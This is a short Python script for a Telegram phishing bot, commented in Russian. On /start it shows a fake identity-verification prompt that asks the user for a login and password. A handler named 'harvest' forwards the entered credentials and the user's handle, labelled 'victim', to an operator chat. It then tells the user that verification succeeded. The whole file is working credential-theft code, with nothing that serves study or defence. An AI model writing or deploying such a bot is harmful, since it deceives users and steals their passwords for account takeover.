import logging  
from telegram import Update, ReplyKeyboardMarkup  
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext  

# логи и параметры бота  
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)  
TOKEN = "API_ТОКЕН"  # api бота
LOGS_CHAT_ID = "CHAT_ID"  # кому отправлять данные  

# /start  
def start(update: Update, context: CallbackContext):  
    # Запрос данных 
    context.bot.send_message(  
        chat_id=update.effective_chat.id,  
        text="🔐 Система требует подтверждения личности.\nВведите логин и пароль через пробел:"  
    )  
  
# обработчик данных  
def harvest(update: Update, context: CallbackContext):  
    credentials = update.message.text.split()  
    if len(credentials) == 2:  
        # отправка данных ботом  
        context.bot.send_message(  
            chat_id=LOGS_CHAT_ID,  
            text=f"🛠️ Данные:\nЛогин: {credentials[0]}\nПароль: {credentials[1]}\nЖертва: @{update.message.from_user.username}"  
        )  
        update.message.reply_text("✅ Верификация успешна. Доступ разрешен.")  

# запуск бота  
def main():  
    updater = Updater(TOKEN, use_context=True)  
    dp = updater.dispatcher  

    # регистрация обработчиков  
    dp.add_handler(CommandHandler("start", start))  
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, harvest))  

    updater.start_polling()  
    updater.idle()  

if __name__ == "__main__":  
    main()
